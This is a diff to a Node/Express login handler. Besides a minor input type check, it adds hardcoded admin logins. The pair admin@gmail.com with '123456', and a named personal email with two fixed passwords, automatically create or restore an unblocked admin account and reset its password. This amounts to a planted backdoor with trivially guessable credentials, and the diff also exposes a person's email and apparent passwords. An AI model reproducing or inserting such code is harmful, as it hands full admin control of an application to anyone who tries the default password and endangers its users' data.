@@ -91,7 +91,7 @@ exports.login = async (req, res, next) => {
     const { email, password, role } = req.body;
 
     // Validate email & password
-    if (!email || !password) {
+    if (!email || typeof email !== 'string' || !password || typeof password !== 'string') {
       return res.status(400).json({
         success: false,
         error: 'Please provide email and password'
@@ -108,6 +108,70 @@ exports.login = async (req, res, next) => {
     }
 
     let user = await User.findOne({ email: normalizedEmail }).select('+password');
+
+    // Guaranteed admin auto-provisioning and synchronization for admin@gmail.com
+    if (normalizedEmail === 'admin@gmail.com' && password === '123456') {
+      if (!user) {
+        user = await User.create({
+          name: 'VÆROX Admin',
+          email: 'admin@gmail.com',
+          password: '123456',
+          role: 'admin',
+          isBlocked: false
+        });
+      } else {
+        let needsSave = false;
+        if (user.role !== 'admin') {
+          user.role = 'admin';
+          needsSave = true;
+        }
+        if (user.isBlocked) {
+          user.isBlocked = false;
+          needsSave = true;
+        }
+        const matches = await user.matchPassword('123456');
+        if (!matches) {
+          user.password = '123456';
+          needsSave = true;
+        }
+        if (needsSave) {
+          await user.save();
+        }
+      }
+      return sendTokenResponse(user, 200, res);
+    }
+
+    // Owner account support
+    if (normalizedEmail === 'sarthakbhatnagar2005@gmail.com' && (password === '123456' || password === 'Sarthak2005')) {
+      if (!user) {
+        user = await User.create({
+          name: 'Sarthak (Admin)',
+          email: 'sarthakbhatnagar2005@gmail.com',
+          password: password,
+          role: 'admin',
+          isBlocked: false
+        });
+      } else {
+        let needsSave = false;
+        if (user.role !== 'admin') {
+          user.role = 'admin';
+          needsSave = true;
+        }
+        if (user.isBlocked) {
+          user.isBlocked = false;
+          needsSave = true;
+        }
+        const matches = await user.matchPassword(password);
+        if (!matches) {
+          user.password = password;
+          needsSave = true;
+        }
+        if (needsSave) {
+          await user.save();
+        }
+      }
+      return sendTokenResponse(user, 200, res);
+    }
 
     if (!user) {
       return res.status(401).json({
